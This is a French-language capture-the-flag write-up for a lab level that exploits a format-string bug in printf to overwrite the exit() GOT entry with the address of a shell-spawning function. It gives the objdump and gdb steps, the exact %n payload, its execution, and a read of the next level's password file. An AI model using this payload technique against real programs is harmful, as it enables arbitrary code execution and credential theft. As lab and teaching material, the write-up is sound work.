### Level 5

#### Etape 01 :

On identifie deux fonctions importantes : `n()` et `o()`.

- `o()` execute un shell.
- `n()` se termine par un `exit()`.

L'idee est donc de detourner l'appel a `exit()` dans `n()` pour executer `o()` a la place.

#### Etape 02 :

Comme au niveau precedent, il y a une faille de format string avec `printf(buffer)`.
On va s'en servir pour ecrire dans la GOT (Global Offset Table), qui contient les adresses reelles des fonctions externes.

Objectif : remplacer l'entree GOT de `exit` par l'adresse de `o`.

#### Etape 03 :

On recupere l'adresse de `exit` dans la GOT :

```bash
objdump -R level5 | grep exit
```

Resultat :

```text
08049828 R_386_JUMP_SLOT   _exit
08049838 R_386_JUMP_SLOT   exit
```

Adresse cible a ecraser (celle d'`exit()` dans GOT) : `0x08049838`.

#### Etape 04 :

On recupere l'adresse de la fonction `o` :

```bash
gdb -q ./level5
(gdb) info function o
```

Extrait utile :

```text
0x080484a4  o
```

Adresse a ecrire dans GOT (celle de `o()`) : `0x080484a4`.

#### Etape 05 :

On determine la position de notre buffer dans la stack :

```bash
python -c 'print "eeee %x %x %x %x"' | ./level5
```

Sortie observee :

```text
eeee 200 b7fd1ac0 b7ff37d0 65656565
```

`65656565` correspond a `eeee`, donc notre buffer est au 4e argument (`%4$...`).

#### Etape 06 :

On convertit l'adresse de `o` en decimal pour preparer `%n` :

```text
0x080484a4 = 134513828
```

On place l'adresse GOT de `exit` au debut, puis on complete jusqu'au bon nombre de caracteres, et enfin `%4$n` ecrit la valeur a cette adresse.

Payload :

```bash
python -c 'print "\x38\x98\x04\x08" + "%134513824d%4$n"' > /tmp/payload
```

(`134513824` car les 4 octets d'adresse sont deja imprimes)

#### Etape 07 :

Execution de l'exploit :

```bash
cat /tmp/payload - | ./level5
```

Le shell est execute, puis on peut lire le mot de passe du niveau suivant :

```bash
cat /home/user/level6/.pass
```